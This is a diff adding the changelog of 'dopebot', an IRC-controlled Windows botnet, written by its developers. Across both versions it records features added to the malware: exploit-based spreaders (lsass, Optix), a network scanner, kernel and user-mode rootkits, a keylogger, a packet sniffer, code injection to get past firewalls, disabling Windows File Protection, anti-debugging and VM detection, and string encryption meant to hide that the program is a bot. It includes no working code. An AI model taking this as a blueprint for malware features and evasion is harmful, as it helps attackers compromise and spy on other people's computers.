@@ -1,0 +1,320 @@
+0.2
+-------
+90.		Went through all files and made some functions use the constant extern settings rather
+		than getting them passed on through function headers, code looks now cleaner and file is
+		0.5kb smaller :) More optmizations could be made though.. LATER! (all files). - dope
+89.		Fixed bug with InternetConnectedState not working when injected. Like below, i just
+		made it ignore the command if injected, only solution i could find (bot.cpp). - dope
+88.		Fixed bug with bot BSOD on Win9x (WMware) when trying to connect to a local ircd.
+		I just made it ignore localhost (bot.cpp). - dope
+87.		Fixed bug with bots in channel running topic commands when you are logged in and
+		chaned the topic (bot.cpp). - dope
+86.		Added externs.h, so all config variables can be called globally.
+		NOT IMPLENTED! (bot.h/externs.h). - dope
+85.		Fixed bug with irc_disconnect() hanging up (irc.cpp). - dope
+84.		Fixed bug with topic command not working (bot.cpp). - dope
+83.		Fixed bug with psniff() crashing when reporting packet (sniffer.cpp). - dope
+82.		Made so get_connection_type() also shows connection name (netinfo.cpp). - dope
+81.		Made so parser first checks command group name and then checks command. Should make
+		parser a bit more faster since it will compare less strings (bot.cpp/config.h). - dope
+80.		Fixed problem with public ircnets detecting bot as "trojan", bling blang, now they dont!
+		(ident.cpp/irc.cpp). - dope	
+79.		Fixed bug with isportopen() timeout, timeout was set too low (scanner.cpp). - dope
+78.		Added unhook_functions(), just a function that executes some unhook() functions.
+		Made it because its used often in injection codes and makes it look less bloated
+		(fwb.cpp/injection.cpp/melt.cpp/unhook.cpp/unhook.h). - dope
+77.		Removed some non important dev. comments (all files). - dope
+76.		Changed and removed some Sleeps() (all files). - dope
+75.		Made some more clean ups to the code (all files). - dope
+74.		Moved irc.cpp/irc.h to Bot\Protocol, i want to have a familiar feeling in the
+		source layout (irc.cpp/irc.h). - dope
+73.		Added so you can choose between Debug config and Release config builds, Debug
+		gives a console with output, while Release does not. Now you _DONT_ have to mess
+		with the pragma in bot.h (bot.h). - dope
+72.		Made so bot rejoins channel if kicked (bot.cpp). - dope
+71.		Made so master gets un-authed if he gets kicked (bot.cpp). - dope
+70.		Added a WORKING sniffer, compared to some other bots ;) psniff() and sniff()
+		(bot.cpp/config.h/defines.h/sniffer.cpp/sniffer.h). - dope
+69.		Added tcpip.h, contains some commonly used packet header structs (tcpip.h). - dope
+68.		Moved patch_tcpip() to sfc.cpp/sfc.h and removed patch.cpp/patch.h
+		(bot.cpp/defines.h/patch.cpp/patch.h/sfc.cpp/sfc.h). - dope
+67.		Added melt(), removes file via code injection, much more secure and leet then using
+		a batch (melt.cpp/melt.h). - dope
+66.		Fixed bug with exploit / port when starting scanner (bot.cpp). - dope
+65.		Fixed bug with scanmain(), reporting exploitation on one ip several times
+		(scanner.cpp). - dope
+64.		Fixed bug with isportopen(), it dosent wait 100sec per port anymore, lol
+		(scanner.cpp). - dope
+63.		Added better error handling to rootlsass(), less false results (lsasspreader.cpp). - dope
+62.		Fixed a big bug with rootlsass(), should work now (Iv said that alot of times
+		now, lol) (lsasspreader.cpp). - dope
+61.		Fixed bug with FTP pass when passing it on in scanner (scanner.cpp). - dope
+60.		Cleaned up all code function names a bit so they look similar (all files). - dope
+59.		Fixed shell_getfile() code a bit (transfer.cpp). - dope
+58.		Fixed bug with destination filename in updatefile() (download.cpp). - dope
+57.		Fixed anoter another connection bug in shell_getfile() (transfer.cpp). - dope
+56.		Fixed small bug with filename in updatefile() (download.cpp). - dope
+55.		Fixed connection bugs in shell_getfile() (transfer.cpp). - dope
+54.		Fixed bug with disable_sfc(), crashed! (sfc.cpp). - dope
+53.		Fixed bug with kernel rootkit installation in installkernelkit() (rootkit.cpp). - dope
+52.		Fixed so that you dont have to have "-" in beginning of exploit name when starting or
+		adding a sploit scan (bot.cpp/scanner.cpp). - dope
+51.		Fixed so if an idiot, like h4x^^, enables both FTPd AND TFTPd, shell_getfile() will
+		only do TFTPd, so a file dosent get downloaded twice or that FTPd dosent get used because
+		TFTPd pwnz it. (misc.cpp/misc.h)
+50.		Added emergency_remove(), used with debug check and wmware check code
+		(install.cpp/install.h). - dope
+49.		Made install() release mutex first time, since mutex problems appear if not
+		(bot.cpp/install.cpp/install.h). - dope
+48.		Moved regport() call from EntryPoint() to install() so it dosent get called on every
+		startup (bot.cpp/install.cpp/install.h). - dope
+47.		Added batch_run(), see bugs.txt, 3, for more info (bot.cpp/install.cpp/install.h). - dope
+46.		Added getparams(), gets parameter passed to bot, might get useful later
+		(misc.cpp/misc.h). - dope
+45.		Fixed bug in unistall() where isfwb() would get wrong filenames to compare and original
+		file wouldnt melt (install.cpp). - dope
+44.		Fixed bug in install() when calling uninstall() making isfwb() crash under Win9X
+		(install.cpp). - dope
+43.		Made so mutex is recreated if fwb is on and when code is injected (bot.cpp). - dope
+42.		Added unhook() to fwb() and injectlib() so firewall dosent prevent us from using the
+		nessecary functions for the fwb and injectlib function (fwb.cpp/injection.cpp). - dope
+41.		Added rvatova(), unhook(), for function unhooking (bot.h/unhook.cpp/unhook.h). - akcom
+40.		Fixed two bugs with isfwb() (bot.cpp/fwb.cpp). - dope
+39.		Fixed bug with scanner, works now (scanner.cpp). - dope
+38.		Made so patch_tcpip.sys checks if the bytes already have been written, so it dosent
+		patch it twice, trice, etc (patch.cpp). - dope
+37.		Fixed a thing in patch_tcpip(), it wouldnt work if FWBed (patch.cpp). - dope
+36.		Added more debug messages (all files). - dope
+35.		Added getconnectiontype(), getconnectioninfo(), getnetinfo() and bot.netinfo command
+		(bot.cpp/bot.h/config.h/netinfo.cpp/netinfo.h). - dope 
+34.		Added cyclecount(), getcomputername() getcpu(), getmem(), getos(), getsysinfo(),
+		getuptime(), getusername() and bot.sysinfo command
+		(bot.cpp/config.h/sysinfo.cpp/sysinfo.h). - dope 
+33.		Added rootlsass(), _NOT_TESTED_
+		(bot.h/..Spreaders\lssasspreader.cpp/..Spreaders\lsasspreader.h/scanner.cpp). - dope
+32.		Added shell_getfile(), connects to shell and makes it get file from tftpd/ftpd.
+		Used together with scanner. (transfer.cpp/transfer.h). - dope
+31.		Added getip(), gets bot ip (misc.cpp/misc.h). - dope
+30.		Added detect_wmw() function, detects WMware
+		(defines.h/secure.cpp/secure.h). - dope
+28.		DLL hook now has working filehide ;) (hook.cpp). - dope
+27.		Added patch_tcpip, patches tcpip on XP SP2, to allow more connections per second
+		(patch.cpp/patch.h). - dope
+26.		Added disable_sfc(), disables Windows File Protection (sfc.cpp/sfc.h). - dope
+25.		Fixed some issues with irc_msg encryption (all files). - dope
+24.		Fixed listprocess() crash bug (bot.cpp). - dope
+23.		Made a few changes to the entrypoint, nothing worth mentioning (bot.cpp). - dope
+22.		Moved uped mutex check so its now checked even earlier then before (bot.cpp). - dope
+21.		Added installuserkit(), uninstalluserkit() (bot.cpp/rootkit.cpp/rootkit.h). - dope
+20.		Added installkernelkit(), uninstallkernelkit() (bot.cpp/rootkit.cpp/rootkit.h). - dope
+19.		Incoming buffer is now printed from line_parse() (irc.cpp). - dope
+18.		Slowed down parser, should be alot more stable though (bot.cpp). - dope
+17.		Changed the way irc_userinfo() sends the info (bot.cpp/irc.cpp/irc.h). - dope
+16.		Fixed bug where bot wouldnt join chan (bot.cpp). - dope
+15.		Removed and shortened some of the Sleeps(), some stuff shud be a bit faster now
+		(all files). - dope
+14.		Fixed bug where bot wouldnt respond to PMs (bot.cpp). - dope
+13.		Fixed a bug in setbotnick() where nick would fuck up if a reconnct was made
+		(misc.cpp). - dope
+12.		Added request file functions to FTPD and TFTPD (ftpd.cpp/ftpd.h/tftpd.cpp/tftpd.h). - dope
+11.		Readded debug messages (bot.cpp). - dope
+10.		Added FWB check to optixspreader (bot.cpp/optixspreader.cpp/scanner.cpp). - dope
+9.		Fixed a bug where bot would BSOD on win9x (bot.cpp). - dope
+8.		Fixed a bug in regwritekey() (registry.cpp). - dope
+7.		Added some missing #ifndefs to the isfwb() calls (all files). - dope
+6.		Started to work on the crypted string thing, the mission is to make all strings crypted
+		to confuse hex editors and simple memdumps, basiclly, not to make it look like a bot if
+		crypted (bot.cpp/config.h). - dope
+5.		Added isfwb() function (fwb.cpp/fwb.h). - dope
+4.		Splitted up "secure.cpp" too (defines.h/bot.cpp/secure.cpp/secure.h). - dope
+3.		Had forgotten to include services.h (bot.h). - dope
+2.		Splitted up "stealth.cpp" a bit. (defines.h/bot.cpp/stealth.cpp/stealth.h). - dope
+1.		Moved rootkit functions to their own file (bot.cpp/rootkit.cpp/rootkit.h). - dope
+
+0.1a RC3
+-------
+149.		Implented rootoptix()
+		(bot.h/..Spreaders\optixspreader.cpp/..Spreaders\optixspreader.h/scanner.cpp). - dope
+148.	OK! I dared to test the scanner, using a "bogus testexploit", and after some bugfixing
+		it works smooth as hell :ph34r: (scanner.cpp/bot.cpp). - dope
+147.	Finished exploit struct, must be some of the ugliest code iv ever made!
+		I dont dare to test it :\ (bot.cpp/scanner.cpp/scanner.h). - dope
+146.	Added registrysecure() loops a regkey writing function
+		(bot.cpp/secure.h/secure.cpp). - dope
+145.	Moved injectcode() to its own file (bot.h/fwb.cpp/fwb.h). - dope
+144.	Updated setpriv() a bit (misc.cpp). - dope
+143.	Remade TFTPD and FTPD a bit, because when using FWB wrong file might get sent
+		(bot.cpp/ftpd.cpp/ftpd.h/tftpd.cpp/tftpd.h)
+142.	Added ANTI-XP-SP2 code (bot.cpp/secure.cpp/secure.h). - dope
+141.	Added so bot can join channel depending on OS (config.h/irc.cpp). - dope
+140.	Added so if uptime on bot is larger than 10days it sets the amount of days in front of
+		nick (misc.cpp). - dope
+139.	Added support for server struct, bot now supports several servers and will loop through
+		the list until a sucessful connection is made :) (bot.cpp/config.h). - dope
+138.	Added installhook() (bot.cpp/stealth.cpp/stealth.h). - dope
+137.	Added injectlib() (injection.cpp/injection.h). - dope
+136.	Added keylogger (bot.cpp/keylogger.cpp/keylogger.h). - dope
+135.	Finished installrootkit(), werd (stealth.cpp). - dope
+134.	Changed the way resources are stored, now they are in opcode rather then
+		regular resource addons, avoids reshacks. (resource.h). - dope
+133.	Added extractres() (file.h/file.cpp). - dope
+132.	Updated ftpd a bit (ftpd.cpp). - dope
+131.	Added updatefile(), finally... (bot.cpp/download.cpp/download.h). - dope
+130.	Redid "install" and "uninstall" functions a bit (install.cpp/install.h). - dope
+129.	Made "install" and "uninstall" functionse use service/registry
+		functions in service.cpp/registry.cpp (instll.cpp/bot.cpp). - dope
+128.	Added service.cpp with functions (service.cpp/service.h). - dope
+127.	Added registry.cpp with functions (registry.cpp/registry.h). - dope
+126.	Removed most of the memsets(), apperntly i dont need them and bot lost 0.5kb
+		(all files). - dope
+125.	Fixed a bug in scanner where it would crash under 9x (scanner.cpp). - dope
+124.	Added "scan.cip" to get current IP scanned
+		(bot.cpp/scanner.cpp/scanner.h). - dope
+123.	Added support for random ip scanning (bot.cpp/scanner.cpp/scanner.h). - dope
+122.	Bot logs failed login attemps use bot.log to see log (bot.cpp). - dope
+121.	Added FTPD :) (bot.cpp/ftpd.cpp/ftpd.h). - dope
+120.	Fixed a few things regarding "uninstall", "disconnect"
+		and use of injection. (bot.cpp/install.cpp/install.h), - dope
+119.	Finished ipscanner :) (bot.cpp/scanner.cpp/scanner.h). - dope
+118.	Fixed a bug with the topic command function (bot.cpp). - dope
+117.	Added more defines (all files). - dope
+116.	Added "killprocess" and "process.kill" (bot.cpp/process.cpp/process.h). - dope
+115.	Added "listprocess" and "process.list" (bot.cpp/process.cpp/process.h). - dope
+114.	Added the Hook project into the dopebot workspace. - dope
+113.	Edited "EntryPoint" a bit (bot.cpp). - dope
+112.	Moved "injectcode" to injection.cpp (injection.cpp/injection.h). - dope
+111.	Added defines to several functions, check "defines.h". - dope
+110.	Changed "securebot" so it only secures under NT, who cares about 9x anyways
+		(secure.cpp). - dope
+109.	Changed "setdebugpriv" to "setpriv", merged "shutdown" priv into it
+		(bot.cpp/misc.cpp/misc.h). - dope
+108.	Added TFTPD (bot.cpp/..\Daemons\tftpd.cpp/tftdp.h). - dope
+107.	Added service startup (bot.cpp/config.h/install.cpp/install.h). - dope
+106.	Added "-s" parameter, just add it after any command and the bot will
+		not reply and be silent (bot.cpp). - dope
+105.	Made identd multithreaded (..\Daemons\identd.cpp). - dope
+104.	Moved ident.cpp and ident.h to "Daemons" folder and renamed to "identd.cpp"
+		and "identd.h" (..\Daemons\ident.h/ident.cpp). - dope
+103.	Merged "injectcode" and "fwb" functions into one. (bot.cpp/stealth.cpp). - dope
+102.	Added "isos9x" and "isosnt" functions (sysinfo.cpp/sysinfo.h). - dope
+101.	Added "shutdown" function, shuts down windows if debugged
+		(misc.cpp/misc.h/secure.cpp). - dope
+100.	Added "hash" and "xor" functions (crypto.cpp/crypto.h). - dope
+99.		Added "bot.raw" command (bot.cpp). - dope
+98.		Rewrote "irc_main" parser, better errorhandling (bot.cpp). - dope
+97.		Added Un-Auth if Master quits (bot.cpp). - dope
+96.		Added "bot.disconnect" command (bot.cpp). - dope
+95.		Fixed a bug in the uninstaller (install.cpp). - dope
+94.		Remade enytrpoint a bit (bot.cpp). - dope
+93.		Added "deletefile" function and command (bot.cpp/file.cpp/file.h). - dope
+92.		Recoded parts of "rootoptix" function (..\Spreaders\optixspreader.cpp). - dope
+91.		Uncommented "getfilesystem" function (bot.h/sysinfo.cpp/sysinfo.h). - dope
+90.		Cleaned up code from useless comments (all-files). - dope
+89.		Added "MINBUF" define. (bot.cpp/defines.h/irc.cpp). - dope
+88.		Cleaned up the "EntryPoint" function a bit (bot.cpp). - dope
+87.		Made parser socket non-blocking, should be slightly faster (bot.cpp). - dope
+86.		Made a "checkdebugger" function, checks if any debuggers are present.
+		(bot.cpp/secure.cpp/secure.h). - akcom
+85.		Cleaned up "rootoptix" code (..\Spreaders\optixspreader.cpp). - dope
+84.		Added "hideproc" code, to hide process from WIN9X taskmanager.
+		(bot.cpp/stealth.cpp/stealt.h). - dope
+83.		Fixed and redudced code on "downloadfile" function. - dope
+82.		More cleanups, binary went down 1kb so far. - dope
+81.		Cleaned the code ALOT, removed no longer nessecary debugmsgs, functions etc.
+		Way too much to list. - dope
+80.		Threaded "securebot" function, mainly coz of lsass patch download
+		(bot.cpp/secure.cpp/secure.h). - dope
+79.		Fixed an issue with NULL Session disablement in "securebot" function (secure.cpp). - dope
+78.		Made some changes to "fwb" function, now allows to choose process to inject into
+		(config.h/stealth.cpp/stealth.h). - dope
+77.		Changed "regport" function to register ident port too (stealth.cpp). - dope
+76.		Added lsass patch update to "securebot" function (secure.cpp). - dope
+75.		Added disable null session to "securebot" function (secure.cpp). - dope
+74.		Remade "irc_parse" function a bit more and removed "commands."
+		(commands.h/bot.cpp). - dope
+73.		Remade "irc_parse" function a bit (bot.cpp). - dope
+72.		Added "download.http" command (bot.cpp/commands.h/commands.txt). - dope
+71.		Added "downloadfile" function (bot.cpp/download.h/download.cpp). - dope
+69.		Chaned how commands look like, they are grouped now, ala Agobot
+		(bot.cpp/commands.h/commands.txt). - dope
+68.		Made a few more changes to "installservice" function (install.cpp/install.h). - dope
+67.		Added "getos" function (sysinfo.cpp/sysinfo.h). - dope
+66.		Added "dopekit.sys" to ..\Resources\ (..\Resources\res.rc). - dope
+65.		Made some changes to the rootkit, stability issues (..\Driver\). - dope
+64.		Remade "installservice" and "uninstallservice" a bit (install.cpp). - dope
+63.		Added "..\Resources\" folder (..\Resources\). - dope
+62.		Added processhide to rootkit ;) (..\Driver\). - dope
+61.		Moved "installservice" and "uninstallservice" functions to install.cpp
+		(install.cpp/install.h). - dope
+60.		Finished "createads", but its not tested and commented out, the kernel rootkit
+		will be used instead! But the code is there for those who wish to have it
+		(stealth.cpp). -dope
+59.		Added "..\Tools\" folder to project, contains some useful tools (..\Tools\). - dope
+58.		Cleaned up the code alot (all-files). - dope
+57.		Remade "firstinstall" function a bit (bot.cpp). - dope
+56.		Added "..\Driver\" folder to project, kernel rootkit, filehide only so far ;) 
+		Not implented (..\Driver\). - dope
+55.		Added "uninstallservice" function (file.cpp/file.h). - dope
+54.		Added "installservice" function (file.cpp/file.h). - dope
+53.		Added debugmessages to "securebot" function (secure.cpp). - dope
+52.		Added masterpassword to "rootoptix", tsk tsk, stupid sl3az3...
+		(..\Spreaders\optixspreader.cpp). - dope
+51.		Changed name of "optix.cpp" to "optixspreader.cpp" and "optix.h" to "optixspreader.h"
+		(..\Spreaders\optixspreader.cpp/optixspreader.h). - dope
+50.		Changed define buffer names a bit (bot.cpp/defines.h). - dope
+49.		Changed "createads" function a bit, disabled for now (bot.cpp/stealth.cpp). - dope
+48.		Added the sexy "dopebot.jpg" (..\Documents\). - dope
+47.		Added "rules.txt", ripped from Ago too ^_^ (..\Documents\). - dope
+46.		Added so you can give commands to one bot only, by placing botnick before.
+		Eg: "bot666 .login hi" (bot.cpp)
+47.		Added "commands.h" generation to ..\Configurator\ (..\Configurator\). - dope
+45.		Fixed "firstinstall" (bot.cpp). - dope
+44.		Added shellcode.cpp and shellcode.h, used later on for exploiting
+		(shellcode.cpp/shellcode.h). - dope
+43.		Added "kpl.txt" (dope's private license, ripped from Ago) to "..\Documents\" folder,
+		read it! (..\Documents\). - dope
+42.		Bot is now licensed under GPL! I felt it was the right thing to do.. Read gpl.txt in
+		"..\Documents\" folder (..\Documents\). - dope
+41.		Fixed an issue with "regport" function (stealth.cpp). - dope
+40.		Fixed an issue with the install (bot.cpp). - dope
+39.		Made some changes to the debug messages, lost 2kb of the binary :o) (all-files). - dope
+38.		Implented "securebot", secures bot on every startup (bot.cpp). - dope
+37.		Added "..\Old" folder to project, contains the first, initial version of the bot
+		(..\Old\). - dope
+36.		Added "securebot" function, not implented (secure.cpp/secure.h). - dope
+35.		Added "setcommands" function (bot.cpp/bot.h). - dope
+34.		Added "firstinstall" function (bot.cpp/bot.h). - dope
+33.		Finished the "Configurator" :o) (..\Configurator\). - dope
+32.		Implented "setdebugpriv" (bot.cpp). - dope
+31.		Added "execute" command, finally :P (bot.cpp/commands.h/commands.txt). - dope
+30.		Added defines for buffers (defines.h). - dope
+29.		Added ..\Configurator\ folder to project, config maker with gui (..\Configurator\). - dope
+28.		Implented "createads", test phase (bot.cpp). - dope
+27.		Added "fileexists" function (file.cpp/file.h). - dope
+26.		Added "regport" function, registers bot port as HTTP service port, pre-rootkit stuff ;o)
+		(bot.cpp/stealth.cpp/stealth.h). - dope
+25.		Added "SetErrorMode" function, to disable ALL errormessages when not debugging (bot.cpp). - dope
+24.		Added "NO_DEBUG" define (defines.h). - dope
+23.		Added debug messages for ALL functions (PHEW!). - dope
+22.		Added "LoadLibrary"ies for injection (bot.cpp). - dope
+21.		Added "createads" function, not implented (stealth.cpp/stealth.h). - dope
+20.		Added "setdebugpriv" function, not implented (misc.cpp/misc.h). - dope
+19.		Added pragma comments for library linking (bot.h). - dope
+18.		Added "fwb" function (bot.cpp/stealth.cpp/stealth.h). - dope
+17.		Added "injectcode" function (bot.cpp/stealth.cpp/stealth.h). - dope
+16.		Added "getfilesystem" function (bot.cpp/bot.h/sysinfo.cpp/sysinfo.h). - dope
+15.		Fixed problem with topic change (bot.cpp). - dope
+14.		Added topic command (bot.cpp/defines.h). - dope
+13.		Added "ident" function (bot.cpp/defines.h/ident.cpp/ident.h). - dope
+12.		Added defines (defines.h). - dope
+11.		Added "rootoptix" function, not implented (..\Spreaders\optix.cpp/optix.h). - dope
+10.		Added "open" command (bot.cpp/commands.h/commands.txt). - dope
+9.		Added "open" function (bot.cpp/file.cpp/file.h). - dope
+8.		Added "execute" function (bot.cpp/file.cpp/file.h). - dope
+7.		Added "remove" command (bot.cpp/comands.h). - dope
+6.		Added "uninstall" function (bot.cpp/install.cpp/install.h). - dope
+5.		Added "install" function (bot.cpp/install.cpp/install.h). - dope
+4.		Added "login, botinfo, logout" commands (bot.cpp/commands.h/commands.txt). - dope
+3.		Added a mutex fix (bot.cpp). - dope
+2.		Added mutex (bot.cpp/bot.h/settings.h). - dope
+1.		Coded the base (bot.cpp/bot.h/irc.cpp/irc.h/settings.h). - dope
